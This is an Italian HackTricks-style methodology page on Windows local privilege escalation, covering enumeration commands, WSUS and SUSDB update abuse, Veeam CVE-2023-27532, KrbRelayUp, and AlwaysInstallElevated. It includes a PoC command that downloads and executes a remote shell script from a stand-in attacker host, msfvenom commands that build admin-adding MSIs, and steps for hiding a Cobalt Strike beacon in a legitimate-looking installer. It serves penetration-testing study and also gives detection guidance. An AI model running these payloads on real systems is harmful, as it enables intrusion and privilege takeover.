# Escalation dei privilegi locali di Windows

{{#include ../../banners/hacktricks-training.md}}

### **Miglior tool per individuare vettori di escalation dei privilegi locali in Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Questa pagina raccoglie metodologie generali per l’escalation dei privilegi in Windows, tratte da diverse guide fondamentali.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Il flusso pratico di enumerazione si basa anche su workshop e checklist della community.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Il materiale storico sugli attacchi include la presentazione di DerbyCon sull’escalation dei privilegi in Windows.<sup>[[5]](#references)</sup>

## Nozioni iniziali su Windows

### Access Token

**Se non sai cosa sono gli access token di Windows, leggi la seguente pagina prima di continuare:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL - DACL/SACL/ACE

**Consulta la seguente pagina per ulteriori informazioni su ACL - DACL/SACL/ACE:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Livelli di integrità

**Se non sai cosa sono i livelli di integrità in Windows, leggi la seguente pagina prima di continuare:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Controlli di sicurezza di Windows

In Windows ci sono diversi elementi che potrebbero **impedirti di enumerare il sistema**, eseguire eseguibili o persino **rilevare le tue attività**. Prima di iniziare l’enumerazione per l’escalation dei privilegi, dovresti **leggere** la seguente **pagina** e **enumerare** tutti questi **meccanismi di difesa**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Anche l’accesso fisico può trasformare una modifica offline della UEFI NVRAM in una catena di attacchi DMA pre-boot e patching della memoria Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Protezione degli amministratori / Elevazione silenziosa UIAccess

I processi UIAccess avviati tramite `RAiLaunchAdminProcess` possono essere sfruttati per raggiungere High IL senza prompt, aggirando i controlli secure-path di AppInfo. Consulta qui il workflow dedicato per aggirare UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagazione del registro di accessibilità del Secure Desktop può essere sfruttata per scrivere arbitrariamente nel registro come SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Le versioni recenti di Windows hanno introdotto anche un vettore LPE **SMB su porta arbitraria**, in cui un’autenticazione NTLM locale privilegiata viene riflessa tramite una connessione TCP SMB riutilizzata:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informazioni sul sistema

### Enumerazione delle informazioni sulla versione

Verifica se la versione di Windows presenta vulnerabilità note (controlla anche le patch applicate).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploit basati sulla versione

Questo [sito](https://msrc.microsoft.com/update-guide/vulnerability) è utile per cercare informazioni dettagliate sulle vulnerabilità di sicurezza Microsoft. Questo database contiene più di 4.700 vulnerabilità di sicurezza e mostra l'**enorme superficie di attacco** offerta da un ambiente Windows.

**Sul sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inventaria la build del sistema operativo, gli aggiornamenti installati e alcuni possibili advisory; verifica il prodotto esatto e gli aggiornamenti sostitutivi prima di considerare applicabile un risultato.

Per un exploit locale specifico per una versione, controlla l'**architettura del processo in esecuzione** oltre a quella del sistema operativo. Su Windows a 64 bit, un processo a 32 bit è soggetto alla [reindirizzamento del file system WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` di solito rimanda alla directory di sistema a 32 bit, mentre `%windir%\Sysnative` consente al processo di accedere alla directory di sistema nativa. L'alias non è disponibile per un processo a 64 bit. La build del sistema operativo o la presenza di un aggiornamento mancante non dimostrano che l'exploit sia utilizzabile; confronta la build in esecuzione, l'aggiornamento installato o sostitutivo, l'architettura del processo e i prerequisiti dell'exploit con il [bollettino di sicurezza Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) relativo al problema specifico.

**In locale, usando le informazioni di sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repository Github di exploit:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ambiente

Ci sono credenziali o informazioni interessanti salvate nelle variabili d'ambiente?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Cronologia di PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### File di trascrizione di PowerShell

Puoi scoprire come attivare questa opzione in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` è solo un esempio. La [criterio di trascrizione di PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) scrive normalmente i file nella cartella Documents di ciascun utente, ma un'impostazione `OutputDirectory` o `Start-Transcript -OutputDirectory` può reindirizzarli a una cartella condivisa o nascosta. Controlla il percorso di output effettivo e le ACL dei file prima di esaminare una trascrizione: potrebbe contenere argomenti dei comandi e output, incluse credenziali. Una trascrizione leggibile è solo un indizio, a meno che il suo contenuto non riveli un'identità con privilegi superiori utilizzabile e che tale identità possa accedere nel contesto pertinente.

### PowerShell Module Logging

Vengono registrati i dettagli delle esecuzioni della pipeline PowerShell, inclusi i comandi eseguiti, le invocazioni dei comandi e parti degli script. Tuttavia, è possibile che non vengano acquisiti i dettagli completi dell'esecuzione né i risultati dell'output.

Per abilitarlo, segui le istruzioni nella sezione "File di trascrizione" della documentazione, scegliendo **"Module Logging"** invece di **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Per visualizzare gli ultimi 15 eventi dai log di PowersShell, puoi eseguire:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Vengono registrati l'intera attività e il contenuto completo dell'esecuzione dello script, assicurando che ogni blocco di codice sia documentato durante l'esecuzione. Questo processo conserva una traccia di audit completa di ogni attività, utile per le analisi forensi e per esaminare i comportamenti dannosi. Documentando tutte le attività al momento dell'esecuzione, fornisce informazioni dettagliate sul processo.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Gli eventi di logging per Script Block si trovano nel Visualizzatore eventi di Windows, nel percorso: **Registri applicazioni e servizi > Microsoft > Windows > PowerShell > Operativo**.\
Per visualizzare gli ultimi 20 eventi, puoi usare:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Impostazioni Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Unità

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Un endpoint WSUS HTTP è un elemento da approfondire per verificare una possibile intercettazione dei metadati degli aggiornamenti. Lo sfruttamento dipende anche dal fatto che il client usi quel server WSUS, che un attaccante possa intercettarne o controllarne il traffico e dalle policy di attendibilità e installazione degli aggiornamenti del client. Il solo URL non garantisce l'esecuzione di codice. [Microsoft consiglia TLS per i metadati WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Per prima cosa, controlla se la rete usa un aggiornamento WSUS non SSL eseguendo quanto segue in cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Oppure quanto segue in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Se ricevi una risposta come una di queste:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` è uguale a `1`.

Quando `UseWUServer` è `1`, Windows Update usa il servizio intranet configurato. Questo conferma un prerequisito per il percorso di intercettazione HTTP, ma non dimostra che sia possibile intercettare il traffico, accettare aggiornamenti malevoli o installarli con privilegi elevati. Quando è `0`, questo specifico endpoint WSUS configurato non viene selezionato da tale criterio.

Per sfruttare queste vulnerabilità si possono usare strumenti come [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus): si tratta di script di exploit MiTM weaponized per iniettare aggiornamenti «fake» nel traffico WSUS non-SSL.

Leggi la ricerca qui:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Leggi il report completo qui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
In sostanza, il bug sfrutta questa vulnerabilità:

> Se possiamo modificare il proxy dell’utente locale e Windows Update usa il proxy configurato nelle impostazioni di Internet Explorer, possiamo eseguire [PyWSUS](https://github.com/GoSecure/pywsus) localmente per intercettare il nostro traffico ed eseguire codice con privilegi elevati sul nostro asset.
>
> Inoltre, poiché il servizio WSUS usa le impostazioni dell’utente corrente, usa anche il suo archivio certificati. Se generiamo un certificato autofirmato per il nome host WSUS e lo aggiungiamo all’archivio certificati dell’utente corrente, potremo intercettare il traffico WSUS sia HTTP che HTTPS. WSUS non usa meccanismi simili a HSTS per implementare una convalida del tipo trust-on-first-use per il certificato. Se il certificato presentato è considerato attendibile dall’utente e ha il nome host corretto, il servizio lo accetterà.

Puoi sfruttare questa vulnerabilità usando lo strumento [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (quando verrà rilasciato).

### Aggiornamenti WSUS controllati dall’amministratore

Esiste un percorso distinto quando l’identità corrente può **pubblicare e approvare** aggiornamenti su un server WSUS. Verifica l’appartenenza effettiva al gruppo `WSUS Administrators` del server e tutte le autorizzazioni WSUS delegate, quindi individua il gruppo di computer client che riceverebbe un aggiornamento approvato. [Microsoft richiede privilegi di WSUS Administrator per approvare gli aggiornamenti](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) e [documenta la relazione di trust per la pubblicazione](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): i client devono considerare attendibile il certificato di firma usato per i contenuti pubblicati localmente. Prima di considerare questo un percorso di escalation, verifica che l’aggiornamento candidato sia firmato e accettato, applicabile al target e installato in un contesto con privilegi superiori. Un valore HTTP `WUServer` o il solo nome di un gruppo non dimostrano che queste condizioni siano soddisfatte.

### Abuso degli aggiornamenti personalizzati di SUSDB: payload non firmati tramite `.txt`/`.esd`

Si tratta di una violazione di un confine di trust distinta dall’intercettazione di una connessione WSUS HTTP: il prerequisito è disporre di accesso sufficiente alle **stored procedure del database WSUS (`SUSDB`)** per pubblicare e approvare un aggiornamento personalizzato. Un possibile punto d’ingresso consiste nel fare relay dell’account computer WSUS upstream verso un server MSSQL separato che ospita `SUSDB`; il prerequisito esatto dipende dalla distribuzione, quindi prima enumera i permessi `EXECUTE` invece di presumere di avere diritti di amministratore SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Per il percorso d’attacco distinto che fa relay dell’autenticazione dei client WSUS da HTTP/8530 a LDAP, SMB o AD CS, vedi [Abuso di WSUS HTTP per NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Creare, indirizzare e approvare l’aggiornamento

Il flusso di lavoro degli aggiornamenti personalizzati usa procedure WSUS legittime come API di pubblicazione con privilegi limitati. Le transizioni di stato importanti sono:<sup>[[38]](#references)</sup>

| Fase | Stored procedure rilevanti |
| --- | --- |
| Importare i metadati dell’aggiornamento | `spImportUpdate` |
| Archiviare i frammenti XML di prerequisito, localizzati ed estesi | `spSaveXMLFragment` |
| Associare il digest del contenuto al relativo URL controllato dall’attaccante | `spSetBatchURL` |
| Enumerare/creare un gruppo di computer e aggiungervi il client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Approvare l’installazione per quel gruppo | `spDeployUpdate` con `@actionID = 0` e `@isAssigned = 1` |

Il nome del file, i digest, le dimensioni e l’handler `CommandLineInstallation` devono corrispondere nei metadati e nei frammenti importati. Dopo aver assegnato l’URL del contenuto e il gruppo target, l’approvazione finale è simile alla seguente; usa identificatori di aggiornamento, gruppo e distribuzione nuovi, invece di riutilizzare i GUID di esempio.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS normalmente rifiuta contenuti eseguibili arbitrari non firmati. Tuttavia, in `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, il percorso .NET `VerifyFile` imposta su false il flag di verifica del certificato quando il nome file fornito termina con `.txt` o `.esd`; `CheckCertificateSignature` viene quindi saltato senza prima verificare che i byte siano testo o un'immagine ESD legittima. Di conseguenza, un PE invariato chiamato, per esempio, `payload.exe.txt` può superare la verifica del contenuto e in seguito essere avviato dal gestore di installazione a riga di comando dell'aggiornamento. Si tratta di un bug di confusione tra policy e tipo, non di una falsificazione della firma.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging e automazione compatibili con BITS

La chiamata a `spDeployUpdate` fa sì che WSUS recuperi il contenuto registrato. L'origine deve soddisfare le aspettative HTTP di BITS: un URL raggiungibile non è sufficiente, perché il trasferimento utilizza un flusso iniziale `HEAD`/`GET` e richieste con intervalli di byte. Un server senza supporto per Range genera un evento di sincronizzazione WSUS `EventId=364`, che indica che BITS richiede l'header del protocollo Range.<sup>[[39]](#references)</sup>

Il PoC di ricerca [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) genera l'SQL necessario per la catena di importazione/frammento/URL/gruppo/deployment, include un client MSSQL modificato per eseguirlo e distribuisce `BitsWebServer.py` per lo staging del contenuto. Un'invocazione minima in un lab autorizzato è:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Esecuzione non presidiata e persistenza tramite retry

L’interazione lato client dipende dai criteri. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opzione `4 - Auto download and schedule install`, fa sì che un aggiornamento approvato venga scaricato e installato secondo la pianificazione configurata, senza che l’utente debba selezionarlo manualmente. Nei test, un payload il cui aggiornamento era rimasto non riuscito/incompleto veniva proposto di nuovo immediatamente dopo l’uscita del processo callback; il comportamento di retry può quindi diventare una persistenza con esecuzione ricorrente. È rumoroso, perché il client mostra lo stato di aggiornamento non riuscito.<sup>[[39]](#references)</sup>

#### Rilevamento e misure di hardening

Utili punti di verifica lato server e lato client per questa catena sono:<sup>[[39]](#references)</sup>

- Verificare l’esecuzione in `SUSDB` di `spCreateTargetGroup`, `spSetBatchURL` e `spDeployUpdate`; analizzare i nuovi gruppi di targeting, le origini di contenuto esterne, i payload di aggiornamento `.txt`/`.esd` e le distribuzioni eseguite da principal inattesi (in particolare account non computer).
- Esaminare `C:\Program Files\Update Services\LogFiles` per `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` (con l’errore di battitura) e `EventId=364`; correlare la verifica all’estensione del payload e alla firma del contenuto, invece di fidarsi del suffisso.
- Cercare installazioni di Windows Update che falliscono e vengono ritentate ripetutamente, nonché esecuzioni PE o attività di rete/processi figlio inattesi da contenuti con nomi `.txt` o `.esd`.
- Ove supportato, richiedere Extended Protection for Authentication per il servizio database e limitare l’accesso di rete al database al server WSUS e ai sistemi amministrativi autorizzati. Ridurre al minimo e verificare i diritti `EXECUTE` sulle stored procedure per gli aggiornamenti personalizzati.

## Aggiornamenti automatici di terze parti e IPC degli agent (local privesc)

Molti agent enterprise espongono una superficie IPC su localhost e un canale di aggiornamento privilegiato. Se l’enrollment può essere forzato a connettersi a un server dell’attaccante e l’updater si fida di una root CA rogue o applica verifiche deboli del signer, un utente locale può fornire un MSI malevolo che il servizio SYSTEM installa. Qui è descritta una tecnica generalizzata (basata sulla catena Netskope stAgentSvc – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM tramite TCP 9401)

Veeam Backup & Replication e Cloud Connect utilizzano un servizio di backup centrale sulla **TCP/9401 per impostazione predefinita**. [L’advisory di Veeam](https://www.veeam.com/kb4424) descrive la divulgazione non autenticata di credenziali cifrate del database di configurazione all’interno del perimetro di rete del backup; un PoC pubblico distinto dimostra un percorso di esecuzione di comandi come **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Il servizio potrebbe essere associato a un indirizzo diverso da localhost: verificare l’indirizzo effettivo e il PID.

- **Ricognizione**: confermare che TCP/9401 appartenga a `Veeam.Backup.Service.exe`, quindi esaminare il prodotto installato e i metadati delle patch. `netstat -ano | findstr 9401` e `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sono indizi, non una verifica completa delle patch.
- **Versioni minime corrette**: Veeam indica **11a build 11.0.1.1261 P20230227** e **12 build 12.0.0.1420 P20230223** come prime release corrette; le release precedenti sono vulnerabili. Una versione file in formato a quattro parti, da sola, non distingue una build base non patchata da una patch successiva sugli stessi numeri di build. Prima di considerare corretta una build di confine, verificare l’identificativo della patch nella [cronologia delle build del vendor](https://www.veeam.com/kb2680).
- **Exploit**: posizionare un PoC come `VeeamHax.exe` insieme alle DLL Veeam richieste nella stessa directory, quindi attivare un payload SYSTEM tramite il socket locale:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

La PoC citata dimostra l'esecuzione di comandi come SYSTEM quando sono soddisfatti i prerequisiti aggiuntivi; l'advisory del vendor descrive il problema di divulgazione delle credenziali.
## KrbRelayUp

Un relay Kerberos locale può passare da un accesso con privilegi inferiori a una scrittura privilegiata nella directory quando un server COM idoneo esegue l'autenticazione e il principal sottoposto a relay dispone dei diritti sull'oggetto di destinazione. [KrbRelay documenta](https://github.com/cube0x0/KrbRelay) le scritture LDAP sia RBCD sia `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizza alcuni di questi percorsi. Una catena RBCD richiede delega applicabile e diritti sull'oggetto di destinazione, mentre una catena shadow-credential richiede diritti di scrittura delle credenziali chiave e un KDC che supporti il percorso di autenticazione tramite certificato. Nessuno dei due percorsi deriva dalla sola appartenenza al dominio.

Verifica le policy effettive del DC per [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) e [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), l'ACL dell'oggetto dell'identità sottoposta a relay e i livelli di autenticazione e impersonificazione della classe COM selezionata. Il tipo di logon del chiamante e il contesto delle credenziali sono importanti: una sessione WinRM può comportarsi diversamente da un logon interattivo o di tipo new-credentials. Anche il routing firewall/OXID e gli aggiornamenti installati possono cambiare il risultato. Considera una policy permissiva o un'ACL corrispondente come elementi da esaminare; l'enumerazione passiva non dovrebbe attivare coercizione COM, autenticazione relay o scritture nella directory. Una shadow credential dell'account computer può portare a un ticket macchina e, solo se tale account dispone dei diritti di replica della directory necessari, a un percorso DCSync separato.

Trova l'**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Per ulteriori informazioni sul flusso dell'attacco, consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Se** queste 2 chiavi del Registro sono **abilitate** (il valore è **0x1**), gli utenti con qualsiasi livello di privilegio possono **installare** (eseguire) file `*.msi` come NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Payloads di Metasploit

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Se hai una sessione meterpreter, puoi automatizzare questa tecnica usando il modulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa il comando `Write-UserAddMSI` di power-up per creare nella directory corrente un file binario MSI di Windows per elevare i privilegi. Questo script genera un programma di installazione MSI precompilato che richiede l'aggiunta di un utente/gruppo (quindi ti servirà l'accesso alla GUI):

```
Write-UserAddMSI
```

Esegui semplicemente il binario creato per aumentare i privilegi.

### MSI Wrapper

Leggi questo tutorial per scoprire come creare un MSI wrapper usando questi strumenti. Nota che puoi creare un wrapper per un file "**.bat**" se vuoi **solo** **eseguire** **righe di comando**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Genera** con Cobalt Strike o Metasploit un **nuovo payload TCP Windows EXE** in `C:\privesc\beacon.exe`
- Apri **Visual Studio**, seleziona **Create a new project** e digita "installer" nella casella di ricerca. Seleziona il progetto **Setup Wizard** e fai clic su **Next**.
- Assegna un nome al progetto, ad esempio **AlwaysPrivesc**, usa **`C:\privesc`** come percorso, seleziona **place solution and project in the same directory** e fai clic su **Create**.
- Continua a fare clic su **Next** fino ad arrivare al passaggio 3 di 4 (scelta dei file da includere). Fai clic su **Add** e seleziona il payload Beacon appena generato. Poi fai clic su **Finish**.
- Seleziona il progetto **AlwaysPrivesc** in **Solution Explorer** e, in **Properties**, modifica **TargetPlatform** da **x86** a **x64**.
  - Puoi modificare anche altre proprietà, come **Author** e **Manufacturer**, per far sembrare più legittima l'app installata.
- Fai clic con il pulsante destro del mouse sul progetto e seleziona **View > Custom Actions**.
- Fai clic con il pulsante destro del mouse su **Install** e seleziona **Add Custom Action**.
- Fai doppio clic su **Application Folder**, seleziona il file **beacon.exe** e fai clic su **OK**. In questo modo il payload Beacon verrà eseguito non appena viene avviato l'installer.
- In **Custom Action Properties**, imposta **Run64Bit** su **True**.
- Infine, **compila il progetto**.
  - Se viene visualizzato l'avviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, assicurati di aver impostato la piattaforma su x64.

### MSI Installation

Per eseguire l'**installazione** del file `.msi` malevolo **in background:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Per sfruttare questa vulnerabilità puoi usare: _exploit/windows/local/always_install_elevated_

## Antivirus e rilevatori

### Impostazioni di controllo

Queste impostazioni determinano cosa viene **registrato**, quindi dovresti prestarvi attenzione

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: è utile sapere dove vengono inviati i log.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** è progettato per la **gestione delle password dell’Amministratore locale**, assicurando che ogni password sia **univoca, casuale e aggiornata regolarmente** sui computer aggiunti a un dominio. Queste password vengono archiviate in modo sicuro in Active Directory e possono essere consultate solo dagli utenti a cui sono state concesse autorizzazioni sufficienti tramite ACL, consentendo loro di visualizzare le password di amministratore locale se autorizzati.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se attivo, **le password in testo semplice vengono archiviate in LSASS** (Local Security Authority Subsystem Service).\
[**Maggiori informazioni su WDigest in questa pagina**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Protezione LSA

A partire da **Windows 8.1**, Microsoft ha introdotto una protezione avanzata per Local Security Authority (LSA) per **bloccare** i tentativi dei processi non attendibili di **leggerne la memoria** o iniettare codice, proteggendo ulteriormente il sistema.\
[**Maggiori informazioni sulla protezione LSA qui**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** è stato introdotto in **Windows 10**. Il suo scopo è proteggere le credenziali memorizzate su un dispositivo da minacce come gli attacchi pass-the-hash. [**Maggiori informazioni su Credential Guard sono disponibili qui.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Credenziali memorizzate nella cache

Le **credenziali di dominio** vengono autenticate dalla **Local Security Authority** (LSA) e utilizzate dai componenti del sistema operativo. Quando i dati di accesso di un utente vengono autenticati da un pacchetto di sicurezza registrato, in genere vengono stabilite le credenziali di dominio per l'utente.\
[**Maggiori informazioni sulle credenziali memorizzate nella cache**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Utenti e gruppi

### Enumerare utenti e gruppi

Dovresti verificare se uno dei gruppi a cui appartieni dispone di autorizzazioni interessanti.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Gruppi privilegiati

